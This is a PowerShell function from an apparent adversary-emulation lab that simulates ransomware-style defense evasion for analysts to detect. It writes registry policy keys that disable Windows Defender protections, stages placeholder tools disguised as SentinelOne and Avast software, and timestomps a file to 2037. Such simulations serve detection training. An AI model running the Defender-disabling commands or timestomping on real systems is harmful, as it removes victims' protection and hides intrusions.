# ============================================================================
# BLURRING THE LINES SIM - PHASE 5: DEFENSE EVASION
# ============================================================================
# Simulates: (1) Windows Defender disabled via HKLM policy keys (also done at
# sim start by the utility; re-asserted here as the actor's explicit step);
# (2) tool masquerading - GT_NET.exe (Grixba) carries spoofed SentinelOne
# metadata, ccs.exe (Betruger) carries spoofed Avast metadata; (3) timestomping
# of ExportData.db to a 2037 future date immediately after GT_NET.exe writes it;
# (4) low-visibility staging under C:\Users\Public\Music.
# MITRE: T1562.001 Impair Defenses, T1036.005 Masquerading, T1070.006 Timestomp,
#        T1027 Obfuscated Files or Information
# ============================================================================

function Simulate-DefenseEvasion {
    param($SimPaths)

    Write-Host "[+] Phase 5: Defense Evasion - Defender policy, masquerading, timestomp ..." -ForegroundColor Green

    # --- Re-assert the Defender policy writes as the actor's explicit action ---
    try {
        $dp = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
        New-Item -Path $dp -Force -ErrorAction SilentlyContinue | Out-Null
        Set-ItemProperty -Path $dp -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
        $rt = "$dp\Real-Time Protection"
        New-Item -Path $rt -Force -ErrorAction SilentlyContinue | Out-Null
        Set-ItemProperty -Path $rt -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path $rt -Name "DisableBehaviorMonitoring" -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
    } catch {}
    Write-SimEvent -EventId 5001 -Message "SIMULATION: Windows Defender disabled via HKLM policy keys (T1562.001)"

    # --- Masquerading: Grixba spoofs SentinelOne, Betruger spoofs Avast --------
    # Drop the recon/backdoor binaries into the staging folder with spoofed
    # product metadata recorded alongside (real PE version resources cannot be
    # rewritten on the benign stand-in, so the spoofed identity is captured in a
    # sidecar the analyst can correlate with the file).
    $gtnet = "$($SimPaths.PublicMusic)\GT_NET.exe"
    New-RunnablePayload -Path $gtnet -OverlayStrings @(
        "SentinelOne Agent", "Grixba network scanner", "SHA256:$($Global:BlurIOCs.Hashes['GT_NET.exe'])"
    ) | Out-Null
    Set-ArtifactTimestamp -Path $gtnet -Anchor $Global:BlurTimeline.Day2 -JitterMinutes 20
    Set-Content -Path "$($SimPaths.Logs)\masquerade_GT_NET.txt" -Value @"
File          : $gtnet
Real identity : Grixba network-scanner (Play-linked recon tool)
Spoofed as    : SentinelOne security software (CompanyName/ProductName)
"@ -Force

    $ccs = "$($SimPaths.PublicMusic)\ccs.exe"
    New-RunnablePayload -Path $ccs -OverlayStrings @(
        "Avast Antivirus", "Betruger backdoor", "SHA256:$($Global:BlurIOCs.Hashes['ccs.exe'])"
    ) | Out-Null
    Set-ArtifactTimestamp -Path $ccs -Anchor $Global:BlurTimeline.Day6 -JitterMinutes 20
    Set-Content -Path "$($SimPaths.Logs)\masquerade_ccs.txt" -Value @"
File          : $ccs
Real identity : Betruger multi-function backdoor (RansomHub-linked)
Spoofed as    : Avast Antivirus component (fake product name + version)
"@ -Force
    Write-SimEvent -EventId 5002 -Message "SIMULATION: GT_NET.exe spoofed as SentinelOne; ccs.exe spoofed as Avast (T1036.005)"

    # --- Timestomp ExportData.db to 2037 (immediately after Grixba writes it) ---
    $exportDb = "$($SimPaths.PublicMusic)\ExportData.db"
    Set-Content -Path $exportDb -Value "SQLite format 3`0[Grixba ExportData.db - BlurringLinesSim lab placeholder]" -Force
    try {
        $future = Get-Date -Year 2037 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0
        $item = Get-Item -LiteralPath $exportDb -Force
        $item.CreationTime = $future; $item.LastWriteTime = $future; $item.LastAccessTime = $future
        Write-Host "    Timestomped ExportData.db -> 2037-01-01" -ForegroundColor DarkGray
    } catch { Write-Warning "Timestomp failed: $($_.Exception.Message)" }
    Write-SimEvent -EventId 5003 -Message "SIMULATION: ExportData.db timestamp set to 2037 (T1070.006 Timestomp)"

    Write-Host "  [OK] Defense Evasion artifacts created (Defender off, masquerade, timestomp)" -ForegroundColor Yellow
}
